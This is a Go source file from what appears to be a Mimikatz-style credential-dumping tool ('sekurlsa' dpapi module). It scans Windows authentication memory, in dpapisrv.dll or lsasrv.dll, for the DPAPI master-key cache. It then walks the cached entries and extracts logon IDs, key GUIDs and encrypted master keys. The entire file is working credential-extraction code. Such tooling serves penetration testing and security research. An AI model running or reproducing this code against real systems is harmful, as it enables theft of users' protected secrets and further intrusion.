package dpapi

import (
	"github.com/vincd/savoir/modules/sekurlsa/packages/globals"
	"github.com/vincd/savoir/utils"
	"github.com/vincd/savoir/utils/binary"
	"github.com/vincd/savoir/windows"
)

type DpApiEntry struct {
	AuthenticationId uint64 `json:"authentication_id"`
	KeyGuid          string `json:"key_guid"`
	EncKey           []byte `json:"-"`
	MasterKey        []byte `json:"master_key"`
}

func ParseDpAPI(l utils.MemoryReader) ([]*DpApiEntry, error) {
	dllName := "dpapisrv.dll"
	if l.BuildNumber() < windows.BuildNumberWindows8 {
		dllName = "lsasrv.dll"
	}

	dpapiEntry, _, err := globals.FindStructurePointerFromSignature(l, dllName, dapApiSignatures)
	if err != nil {
		return nil, err
	}

	entries := make([]*DpApiEntry, 0)
	ptr := *dpapiEntry
	for ptr > 0 {
		entry := &KiwiMasterKeyCacheEntry{}
		if err := l.ReadStructure(ptr, entry); err != nil {
			return nil, err
		}

		if entry.Flink == *dpapiEntry {
			break
		}

		keyOffset := binary.GetStructureFieldOffset(KiwiMasterKeyCacheEntryType, "Key", l.ProcessorArchitecture().Isx64())
		key, err := l.Read(ptr.WithOffset(keyOffset), entry.KeySize)
		if err != nil {
			return nil, err
		}

		entries = append(entries, &DpApiEntry{
			AuthenticationId: entry.LogonId,
			KeyGuid:          entry.KeyUid.String(),
			EncKey:           key,
		})

		ptr = entry.Flink
	}

	return entries, nil
}
